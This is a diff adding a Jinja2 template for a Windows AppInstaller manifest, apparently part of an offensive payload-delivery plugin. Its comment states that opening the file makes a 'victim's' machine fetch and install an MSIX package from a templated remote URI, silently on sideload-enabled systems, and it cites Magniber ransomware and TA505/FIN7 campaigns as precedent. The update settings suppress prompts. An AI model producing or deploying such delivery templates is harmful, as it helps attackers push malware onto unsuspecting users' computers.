@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    Windows AppInstaller manifest template.
+    Rendered by plugin_container_msix.py via Jinja2.
+
+    When a victim opens this .appinstaller file, Windows' App Installer
+    (appinstaller.exe) fetches the MSIX package from MainPackage.Uri and
+    installs it - silently on sideload-enabled targets, with a one-click
+    prompt on developer-mode targets.
+
+    Threat actor precedent: Magniber ransomware, TA505 / FIN7 campaigns.
+-->
+<AppInstaller
+    xmlns="http://schemas.microsoft.com/appx/appinstaller/2018"
+    Version="{{ version }}"
+    Uri="{{ appinstaller_uri }}">
+
+    <MainPackage
+        Name="{{ package_name }}"
+        Publisher="{{ publisher_dn }}"
+        Version="{{ version }}"
+        Uri="{{ msix_uri }}"
+        ProcessorArchitecture="{{ arch }}" />
+
+    <UpdateSettings>
+        <OnLaunch
+            HoursBetweenUpdateChecks="0"
+            ShowPrompt="false"
+            UpdateBlocksActivation="false" />
+    </UpdateSettings>
+
+</AppInstaller>
